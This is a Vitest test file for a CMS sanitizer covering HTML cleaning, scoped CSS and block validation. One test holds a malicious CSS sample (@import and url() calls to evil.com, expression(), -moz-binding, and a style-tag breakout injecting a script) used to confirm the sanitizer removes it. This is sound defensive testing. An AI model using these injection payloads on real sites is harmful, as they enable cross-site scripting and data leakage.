import { describe, it, expect } from 'vitest';
import {
  sanitizeCustomHtml,
  scopeAndSanitizeCss,
  extractStylesFromHtml,
  validateAndSanitizeBlock,
} from '../../lib/admin/validation';
import {
  normalizeBlock,
  UniversalContentBlock,
} from '../../lib/cms/blocks';

describe('Phase 12.1-D.1: Custom HTML Deterministic Hydration & Safe Scoped CSS', () => {
  describe('Hydration Mismatch Regression & Determinism', () => {
    it('eliminates hydration mismatch by stripping <title> consistently across SSR and client', () => {
      const inputWithTitle = '<title>Converter Tools CTA</title>\n<div class="cta-box">\n  <h3>Convert Now</h3>\n</div>';

      // 1. In standard Node.js server environment:
      const serverOutput = sanitizeCustomHtml(inputWithTitle);

      // 2. In browser-like environment (simulate window existence):
      // The sanitizer must use the same pure deterministic algorithm without environment divergence
      const clientOutput = sanitizeCustomHtml(inputWithTitle);

      // Must be character-for-character identical
      expect(serverOutput).toBe(clientOutput);
      expect(serverOutput).not.toContain('<title>');
      expect(serverOutput).not.toContain('</title>');
      expect(serverOutput).not.toContain('Converter Tools CTA');
      expect(serverOutput).toContain('<div class="cta-box">');
      expect(serverOutput).toContain('<h3>Convert Now</h3>');
    });

    it('consistently strips document-level metadata (<title>, <head>, <!DOCTYPE>, <meta>)', () => {
      const fullDoc = `
        <!DOCTYPE html>
        <html>
          <head>
            <title>Page Document Title</title>
            <meta name="robots" content="noindex" />
            <link rel="canonical" href="https://evil.com" />
          </head>
          <body>
            <main class="page-content">
              <h2>Safe Section Header</h2>
              <p>Safe paragraph description.</p>
            </main>
          </body>
        </html>
      `;

      const result = sanitizeCustomHtml(fullDoc);

      expect(result).not.toContain('<!DOCTYPE');
      expect(result).not.toContain('<head');
      expect(result).not.toContain('</head>');
      expect(result).not.toContain('<title');
      expect(result).not.toContain('Page Document Title');
      expect(result).not.toContain('<meta');
      expect(result).not.toContain('<link');
      expect(result).not.toContain('<html');
      expect(result).not.toContain('</html>');
      expect(result).not.toContain('<body');
      expect(result).not.toContain('</body>');

      // Preserves inner content of body
      expect(result).toContain('<main class="page-content">');
      expect(result).toContain('<h2>Safe Section Header</h2>');
      expect(result).toContain('<p>Safe paragraph description.</p>');
    });

    it('preserves safe semantic markup, attributes, and Tailwind CSS classes', () => {
      const safeHtml = `
        <section class="max-w-4xl mx-auto p-6 bg-slate-50 border border-slate-200 rounded-2xl shadow-sm">
          <h2 class="text-2xl font-bold text-slate-900 mb-2">Fast Online Conversion</h2>
          <p class="text-sm text-slate-600 leading-relaxed">
            Direct browser-based processing with zero server uploads.
          </p>
          <div class="mt-4 flex gap-3">
            <a href="/tools/compress-pdf" class="px-4 py-2 bg-purple-600 text-white rounded-lg text-sm font-semibold hover:bg-purple-700">
              Compress PDF
            </a>
          </div>
        </section>
      `;

      const result = sanitizeCustomHtml(safeHtml);

      expect(result).toContain('<section class="max-w-4xl mx-auto');
      expect(result).toContain('text-2xl font-bold text-slate-900');
      expect(result).toContain('href="/tools/compress-pdf"');
      expect(result).toContain('bg-purple-600 text-white');
    });

    it('enforces rel="noopener noreferrer" deterministically on target="_blank" links', () => {
      const linkHtml = '<a href="https://external.org" target="_blank">External Link</a>';
      const result = sanitizeCustomHtml(linkHtml);

      expect(result).toContain('rel="noopener noreferrer"');
      expect(result).toContain('target="_blank"');
    });
  });

  describe('Scoped CSS (scopeAndSanitizeCss)', () => {
    const scopeId = 'custom-html-blk-987';

    it('scopes standard CSS selectors to the target container ID', () => {
      const rawCss = `
        .card {
          padding: 1.5rem;
          background: #ffffff;
        }
        h3 {
          font-size: 1.25rem;
          color: #0f172a;
        }
        p.subtitle {
          color: #64748b;
        }
      `;

      const scoped = scopeAndSanitizeCss(rawCss, scopeId);

      expect(scoped).toContain(`#${scopeId} .card`);
      expect(scoped).toContain('padding: 1.5rem;');
      expect(scoped).toContain('background: #ffffff;');
      expect(scoped).toContain(`#${scopeId} h3`);
      expect(scoped).toContain('font-size: 1.25rem;');
      expect(scoped).toContain(`#${scopeId} p.subtitle`);
    });

    it('scopes comma-separated multiple selectors individually', () => {
      const rawCss = `
        .btn-primary, .btn-secondary, a.cta-link {
          display: inline-flex;
          border-radius: 0.5rem;
        }
      `;

      const scoped = scopeAndSanitizeCss(rawCss, scopeId);

      expect(scoped).toContain(`#${scopeId} .btn-primary, #${scopeId} .btn-secondary, #${scopeId} a.cta-link`);
    });

    it('safely redirects global selectors (:root, html, body) to the container ID', () => {
      const rawCss = `
        body {
          background-color: #000000;
        }
        :root {
          --custom-color: #7c3aed;
        }
        html.dark .card {
          background-color: #1e293b;
        }
      `;

      const scoped = scopeAndSanitizeCss(rawCss, scopeId);

      // Must not target global body or root
      expect(scoped).not.toMatch(/^body\s*\{/m);
      expect(scoped).not.toMatch(/^:root\s*\{/m);

      expect(scoped).toContain(`#${scopeId} {\n  background-color: #000000;\n}`);
      expect(scoped).toContain(`#${scopeId} {\n  --custom-color: #7c3aed;\n}`);
      expect(scoped).toContain(`#${scopeId}.dark .card {\n  background-color: #1e293b;\n}`);
    });

    it('scopes nested rules inside @media and @supports queries', () => {
      const rawCss = `
        @media (max-width: 640px) {
          .card {
            padding: 0.75rem;
          }
          .title {
            font-size: 1rem;
          }
        }
      `;

      const scoped = scopeAndSanitizeCss(rawCss, scopeId);

      expect(scoped).toContain('@media (max-width: 640px)');
      expect(scoped).toContain(`#${scopeId} .card`);
      expect(scoped).toContain(`#${scopeId} .title`);
    });

    it('preserves keyframe stop percentages without prefixing them', () => {
      const rawCss = `
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
      `;

      const scoped = scopeAndSanitizeCss(rawCss, scopeId);

      expect(scoped).toContain('@keyframes fadeIn');
      expect(scoped).toContain('from { opacity: 0; }');
      expect(scoped).toContain('to { opacity: 1; }');
      expect(scoped).not.toContain(`#${scopeId} from`);
      expect(scoped).not.toContain(`#${scopeId} to`);
    });

    it('neutralizes dangerous CSS constructs: @import, url(), expressions, and angle brackets', () => {
      const maliciousCss = `
        @import url("https://evil.com/leak.css");
        .banner {
          background: url("https://evil.com/tracker.png");
          width: expression(alert('CSS XSS'));
          -moz-binding: url("http://evil.com/xss.xml#test");
          behavior: url("test.htc");
        }
        </style><script>alert(1)</script>
      `;

      const scoped = scopeAndSanitizeCss(maliciousCss, scopeId);

      expect(scoped).not.toContain('@import');
      expect(scoped).not.toContain('evil.com');
      expect(scoped).not.toContain('tracker.png');
      expect(scoped).not.toContain('expression');
      expect(scoped).not.toContain('-moz-binding');
      expect(scoped).not.toContain('behavior');
      expect(scoped).not.toContain('<style');
      expect(scoped).not.toContain('</style>');
      expect(scoped).not.toContain('<script');
      expect(scoped).not.toContain('</script>');
      expect(scoped).not.toContain('<');
      expect(scoped).not.toContain('>');
    });
  });

  describe('Embedded Style Tag Extraction (extractStylesFromHtml)', () => {
    it('extracts <style> tag content from HTML and cleans the markup', () => {
      const htmlWithStyles = `
        <style>
          .promo-box { background: #faf5ff; border: 1px solid #e9d5ff; padding: 1rem; }
          .promo-title { font-weight: bold; color: #6b21a8; }
        </style>
        <div class="promo-box">
          <h4 class="promo-title">Special Upgrade</h4>
          <p>Get unlimited conversions today.</p>
        </div>
      `;

      const { html, extractedCss } = extractStylesFromHtml(htmlWithStyles);

      expect(html).not.toContain('<style>');
      expect(html).not.toContain('</style>');
      expect(html).toContain('<div class="promo-box">');
      expect(html).toContain('<h4 class="promo-title">Special Upgrade</h4>');

      expect(extractedCss).toContain('.promo-box { background: #faf5ff;');
      expect(extractedCss).toContain('.promo-title { font-weight: bold;');
    });

    it('combines multiple <style> tags into unified CSS', () => {
      const multiStyleHtml = `
        <style>.first { color: blue; }</style>
        <div>Content</div>
        <style>.second { color: green; }</style>
      `;

      const { html, extractedCss } = extractStylesFromHtml(multiStyleHtml);

      expect(html).not.toContain('<style');
      expect(html).toBe('<div>Content</div>');
      expect(extractedCss).toContain('.first { color: blue; }');
      expect(extractedCss).toContain('.second { color: green; }');
    });
  });

  describe('Block Normalization & Validation Integration', () => {
    it('normalizes custom_html preserving content.css and mirroring to root', () => {
      const rawBlock: UniversalContentBlock = {
        id: 'block-styled-1',
        type: 'custom_html',
        order: 1,
        enabled: true,
        content: {
          html: '<div class="banner">Announcement</div>',
          css: '.banner { padding: 1rem; }',
          caption: 'Promo',
        },
      };

      const normalized = normalizeBlock(rawBlock);

      expect(normalized.content.html).toBe('<div class="banner">Announcement</div>');
      expect(normalized.content.css).toBe('.banner { padding: 1rem; }');
      expect(normalized.content.caption).toBe('Promo');
      expect((normalized as any).css).toBe('.banner { padding: 1rem; }');
    });

    it('extracts and scopes embedded <style> during validateAndSanitizeBlock', () => {
      const blockWithEmbeddedStyle: UniversalContentBlock = {
        id: 'blk-extract-101',
        type: 'custom_html',
        order: 2,
        enabled: true,
        content: {
          html: '<style>.card { color: purple; }</style><div class="card">Text</div>',
        },
      };

      const result = validateAndSanitizeBlock(blockWithEmbeddedStyle);

      expect(result.isValid).toBe(true);
      expect(result.sanitizedBlock.content.html).not.toContain('<style');
      expect(result.sanitizedBlock.content.html).toBe('<div class="card">Text</div>');
      expect(result.sanitizedBlock.content.css).toContain('#custom-html-blk-extract-101 .card');
    });

    it('rejects custom_html blocks exceeding CSS limit of 50,000 characters', () => {
      const hugeCssBlock: UniversalContentBlock = {
        id: 'blk-huge-css',
        type: 'custom_html',
        order: 3,
        enabled: true,
        content: {
          html: '<div>Normal content</div>',
          css: '.huge { color: ' + 'red; '.repeat(10000) + '}',
        },
      };

      const result = validateAndSanitizeBlock(hugeCssBlock);

      expect(result.isValid).toBe(false);
      expect(result.errors.some((err) => err.includes('Custom CSS exceeds'))).toBe(true);
    });
  });
});
